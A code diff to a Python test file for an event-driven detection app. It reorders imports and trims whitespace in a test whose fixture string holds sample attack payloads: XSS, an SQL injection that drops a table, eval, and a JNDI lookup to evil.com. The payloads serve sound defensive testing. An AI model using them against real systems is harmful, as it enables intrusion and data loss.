@@ -14,12 +14,11 @@ from app.domain.entities import (
 )
 from app.domain.value_objects import AnomalyScore, MetricValue, SourceSystem
 from app.events.event_store import InMemoryEventStore
-from app.events.handlers import IncidentEventHandler, LogEventHandler, MLEventHandler
 
 # Import modules that need coverage
-from app.events.middleware import AuditMiddleware, LoggingMiddleware, MetricsMiddleware
 from app.infrastructure.ml.preprocessing.text_processor import LogTextProcessor
-
+from app.events.middleware import AuditMiddleware, LoggingMiddleware, MetricsMiddleware
+from app.handlers.event_handlers import LogEventHandler, IncidentEventHandler, MLEventHandler
 
 class TestMiddleware:
     """Tests for event middleware."""
@@ -389,7 +388,7 @@ class TestTextProcessorEdgeCases:
         # Test with multiple threat types in one message
         complex_threat = """
         <script>alert('xss')</script>
-        javascript:void(0) 
+        javascript:void(0)
         eval(malicious_code)
         SELECT * FROM users; DROP TABLE users;
         ${jndi:ldap://evil.com}
